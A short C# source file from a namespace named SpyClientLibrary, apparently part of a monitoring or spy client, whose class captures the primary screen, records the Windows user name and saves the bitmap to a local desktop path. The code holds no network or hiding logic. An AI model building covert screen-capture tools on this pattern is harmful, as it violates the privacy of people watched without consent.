using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Windows.Forms;

namespace SpyClientLibrary
{
    public class ScreenShot
    {
        public Bitmap _currentScreen { get; }
        public DateTime _scrrenData { get; set; }
        public string _user { get; set; }
        public string _screenName { get; set; }

        public ScreenShot()
        {
            getWindowsUser();
        }

        public void generateCurrentScreen()
        {
            _scrrenData = DateTime.Now;

            using (Bitmap bmpScreenCapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                            Screen.PrimaryScreen.Bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bmpScreenCapture))
                {
                    g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                     Screen.PrimaryScreen.Bounds.Y,
                                     0, 0,
                                     bmpScreenCapture.Size,
                                     CopyPixelOperation.SourceCopy);
                }
                bmpScreenCapture.Save("C:\\Users\\Michał\\Desktop\\" + _scrrenData.Millisecond+".bmp");
              
}
          
            
        }
        private string createScreenName()
        {
            _screenName = _user + _scrrenData.ToString() +".bmp";
            return _screenName;
        }
        private void getWindowsUser()
        {
            _user= System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        }
    }
}
